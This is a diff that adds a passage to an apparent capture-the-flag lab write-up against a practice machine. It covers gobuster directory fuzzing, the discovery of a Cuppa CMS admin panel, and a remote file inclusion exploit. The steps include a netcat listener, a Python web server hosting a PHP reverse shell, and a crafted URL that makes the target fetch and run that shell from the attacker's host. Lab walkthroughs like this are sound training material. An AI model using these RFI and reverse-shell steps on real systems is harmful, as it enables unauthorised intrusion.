@@ -241,4 +241,50 @@ cat important.txt
 
 Maybe /45kra24zxs28v3yd is a directory?
 
+Turns out that it is! - http://10.10.116.94/45kra24zxs28v3yd/ - leads to the personal page of milesdyson
+
+Lets go directory fuzzing!
+
+gobuster dir -u http://10.10.116.94:80/45kra24zxs28v3yd -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.116.94:80/45kra24zxs28v3yd
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2024/03/12 21:21:18 Starting gobuster
+===============================================================
+/administrator (Status: 301)
+===============================================================
+
+
+We now navigate to the /administrator directory and see that it is running Cuppa CMS.
+We search online for any exploits related to Cuppa CMS and find one for Remote File Inclusion
+
+https://www.exploit-db.com/exploits/25971
+
+We copy the exploit and run it against the target while calling a reverse PHP shell script (seperate download) located on our system.!
+
+1 - START A PYTHON HTTP SERVER IN THE SAME DIRECTORY AS SHELL.PHP TO ALLOW THE TARGET WEB SERVER TO GET THE PHP REVERSE SHELL:
+python3 -m http.server 8000
+
+2 - START A NETCAT LISTENER WITH SAME PORT AS SHELL.PHP ONE TO ALLOW THE REVERSE SHELL TO CONNECT TO TARGET:
+nc -lvnp 1234
+
+3 - MAKE THE FOLLOWING REQUEST IN THE WEB BROWSER BAR TO EXPLOIT RFI
+http://10.10.116.94/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.71.50:8000/shell.php
+
+4 - NOW HAVE A SHELL AS USER! Read the user flag!
+
+----------------------------------------------------------------------------------------
+
+Now to get root!
+
+
+
 
